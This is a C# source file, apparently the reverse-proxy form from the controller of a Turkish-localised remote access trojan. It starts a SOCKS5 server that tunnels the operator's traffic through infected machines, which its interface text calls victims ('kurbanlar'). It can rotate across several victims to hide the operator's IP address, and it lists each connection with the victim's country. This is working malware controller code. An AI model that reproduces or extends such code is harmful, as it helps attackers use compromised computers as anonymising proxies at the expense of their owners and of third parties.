using System;
using System.Globalization;
using System.Net.Sockets;
using System.Windows.Forms;
using xServer.KuuhakuCekirdek.Veri;
using xServer.KuuhakuCekirdek.Yardımcılar;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.ReverseProxy;

namespace xServer.Formlar
{
    public partial class FrmTersProxy : Form
    {
        private readonly Client[] _clients;
        private ReverseProxyServer SocksServer { get; set; }
        private ReverseProxyClient[] _openConnections;
        private Timer _refreshTimer;

        public FrmTersProxy(Client[] clients)
        {
            this._clients = clients;

            foreach (Client c in clients)
            {
                if (c == null || c.Value == null) continue;
                c.Value.FrmProxy = this;
            }

            InitializeComponent();
        }

        private void FrmReverseProxy_Load(object sender, EventArgs e)
        {
            if (_clients.Length > 1)
            {
                this.Text = "Ters Proxy [Yük Dengeleyici aktif]";
                lblLoadBalance.Text = "Yük Dengeleyici aktif, " + _clients.Length + " kurbanlar proxy olarak kullanılacaktır.\r\nwww.ipchicken.com'da sayfayı yenileyip durunuz, orada eğer ipniz sürekli değişiyorsa çalışıyor demektir.";
            }
            else if (_clients.Length == 1)
            {
                this.Text = PencereYardımcısı.GetWindowTitle("Ters Proxy", _clients[0]);
                lblLoadBalance.Text = "Yük Dengeleyici aktif değildir., sadece bir kurban kullanılıyor, birden çok kurban seçerek aktifleştirebilirsiniz.";
            }
            nudServerPort.Value = Ayarlar.ReverseProxyPort;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                ushort port = GetPortSafe();

                if (port == 0)
                {
                    MessageBox.Show("Lütfen 0'dan büyük geçerli bir port giriniz..", "Lütfen geçerli bir port giriniz.", MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    return;
                }

                SocksServer = new ReverseProxyServer();
                SocksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
                SocksServer.OnUpdateConnection += socksServer_onUpdateConnection;
                SocksServer.StartServer(_clients, "0.0.0.0", port);
                ToggleButtons(true);

                _refreshTimer = new Timer();
                _refreshTimer.Tick += RefreshTimer_Tick;
                _refreshTimer.Interval = 100;
                _refreshTimer.Start();
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show("Port zaten kullanımda..", "Dinleme Hatası", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show(
                        string.Format(
                            "Bilinmeyen bir soket hatası oluştu.: {0}\n\nHata Kodu: {1}\n\nLütfen en yakın zamanda burdan hatayı bana ihbar ediniz.:\n{2}",
                            ex.Message, ex.ErrorCode, Ayarlar.HelpURL), "Bilinmeyen Dinleme Hatası", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                btnStop_Click(sender, null);
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    string.Format(
                        "An unexpected error occurred: {0}\n\nLütfen en yakın zamanda burdan hatayı bana ihbar ediniz.:\n{1}",
                        ex.Message, Ayarlar.HelpURL), "Bilinmeyen Dinleme Hatası", MessageBoxButtons.OK, MessageBoxIcon.Error);
                btnStop_Click(sender, null);
            }
        }

        void RefreshTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                lock (SocksServer)
                {
                    this._openConnections = SocksServer.OpenConnections;
                    lstConnections.VirtualListSize = this._openConnections.Length;
                    lstConnections.Refresh();
                }
            }
            catch { }
        }

        private ushort GetPortSafe()
        {
            var portValue = nudServerPort.Value.ToString(CultureInfo.InvariantCulture);
            ushort port;
            return (!ushort.TryParse(portValue, out port)) ? (ushort)0 : port;
        }

        void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
        {

        }

        void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
        {

        }

        private void ToggleButtons(bool t)
        {
            btnStart.Enabled = !t;
            nudServerPort.Enabled = !t;
            btnStop.Enabled = t;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if (_refreshTimer != null)
                _refreshTimer.Stop();
            ToggleButtons(false);
            if (SocksServer != null)
                SocksServer.Stop();

            try
            {
                SocksServer.OnConnectionEstablished -= socksServer_onConnectionEstablished;
                SocksServer.OnUpdateConnection -= socksServer_onUpdateConnection;
            }
            catch { }
        }

        private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            Ayarlar.ReverseProxyPort = GetPortSafe();
            btnStop_Click(sender, null);

            for (int i = 0; i < _clients.Length; i++)
            {
                if (_clients[i] != null && _clients[i].Value != null)
                    _clients[i].Value.FrmProxy = null;
            }
        }

        private void nudServerPort_ValueChanged(object sender, EventArgs e)
        {
            lblProxyInfo.Text = string.Format("Bu SOCKS5 Proxysine Bağlanın: 127.0.0.1:{0} (id/şifre istemez)", nudServerPort.Value);
        }

        private void LvConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
        {
            lock (SocksServer)
            {
                if (e.ItemIndex < _openConnections.Length)
                {
                    ReverseProxyClient connection = _openConnections[e.ItemIndex];

                    e.Item = new ListViewItem(new string[]
                    {
                        connection.Client.EndPoint.ToString(),
                        connection.Client.Value.Ülke,
                        (connection.HostName.Length > 0 && connection.HostName != connection.TargetServer) ? string.Format("{0}  ({1})", connection.HostName, connection.TargetServer) : connection.TargetServer,
                        connection.TargetPort.ToString(),
                        DosyaYardımcısı.GetDataSize(connection.LengthReceived),
                        DosyaYardımcısı.GetDataSize(connection.LengthSent),
                        connection.Type.ToString()
                    }) { Tag = connection };
                }
            }
        }

        private void killConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lock (SocksServer)
            {
                if (lstConnections.SelectedIndices.Count > 0)
                {
                    int[] items = new int[lstConnections.SelectedIndices.Count];
                    lstConnections.SelectedIndices.CopyTo(items, 0);

                    foreach (int index in items)
                    {
                        if (index < _openConnections.Length)
                        {
                            ReverseProxyClient connection = _openConnections[index];
                            if (connection != null)
                            {
                                connection.Disconnect();
                            }
                        }
                    }
                }
            }
        }

        private void lblLoadBalance_Click(object sender, EventArgs e)
        {

        }
    }
}